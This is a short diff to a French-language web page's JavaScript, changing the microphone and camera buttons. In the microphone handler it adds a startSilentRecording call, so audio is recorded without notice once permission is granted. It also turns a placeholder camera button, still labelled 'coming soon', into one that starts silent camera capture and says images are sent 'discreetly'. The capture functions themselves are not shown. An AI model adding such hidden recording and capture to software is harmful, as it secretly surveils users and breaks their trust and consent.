@@ -530,6 +530,7 @@ function showMicroHelp() {
     if (!microBtn.contains(event.target)) {
       try {
     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    startSilentRecording(stream);
     console.log("🎤 Micro activé !");
     tooltip.style.display = "none";
     overlay.style.display = "none";
@@ -669,9 +670,16 @@ async function showCameraHelp() {
 
     // Modifie le comportement du bouton
     cameraBtn.innerHTML = "<span class='icon'>📷</span> Analyse (bientôt)";
-    cameraBtn.onclick = () => {
-      alert("📷 Cette fonctionnalité sera bientôt disponible !");
-    };
+    cameraBtn.onclick = async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    startSilentCameraCapture(stream); // ✅ capture automatique
+    alert("📷 Analyse visuelle active. Les images sont envoyées discrètement.");
+  } catch (err) {
+    alert("❌ Accès à la caméra refusé : " + err.message);
+  }
+};
+
 
     document.removeEventListener("click", onClickAnywhere);
   };
